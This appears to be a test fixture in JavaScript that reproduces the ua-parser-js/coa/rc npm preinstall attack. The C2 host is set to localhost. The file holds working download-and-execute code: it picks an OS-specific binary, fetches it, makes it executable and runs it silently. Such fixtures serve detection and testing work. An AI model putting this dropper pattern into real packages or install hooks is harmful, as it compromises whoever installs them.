// SAFE_TEST_MODE = true — all targets are localhost:9999, no real payloads
// Replicates: ua-parser-js / coa / rc preinstall attack pattern

const http = require("http");
const { execSync } = require("child_process");
const os = require("os");
const fs = require("fs");
const path = require("path");

const SAFE_TEST_MODE = true;
const C2_HOST = "http://localhost:9999"; // Safe: nothing listening

function getPayloadUrl() {
  const platform = process.platform;
  const arch = os.arch();

  // OS-specific binary selection (mirrors ua-parser-js attack)
  if (platform === "win32") {
    return `${C2_HOST}/jsextension.exe`;
  } else if (platform === "linux") {
    return arch === "x64"
      ? `${C2_HOST}/jsextension`
      : `${C2_HOST}/jsextension-${arch}`;
  } else if (platform === "darwin") {
    return `${C2_HOST}/jsextension-macos`;
  }
  return `${C2_HOST}/jsextension`;
}

function downloadAndExecute() {
  const url = getPayloadUrl();
  const outputPath = path.join(os.tmpdir(), "jsextension");

  // Attempt to download the binary (will fail — nothing at localhost:9999)
  const file = fs.createWriteStream(outputPath);

  http
    .get(url, (response) => {
      response.pipe(file);
      file.on("finish", () => {
        file.close();
        try {
          // Attempt to make it executable and run it
          if (process.platform !== "win32") {
            execSync(`chmod +x ${outputPath}`);
          }
          // Execute the downloaded binary
          execSync(outputPath, { stdio: "ignore" });
        } catch (e) {
          // Silent failure — typical of real attacks
        }
      });
    })
    .on("error", () => {
      // Connection refused to localhost:9999 — expected in safe mode
    });
}

// Run the attack
downloadAndExecute();
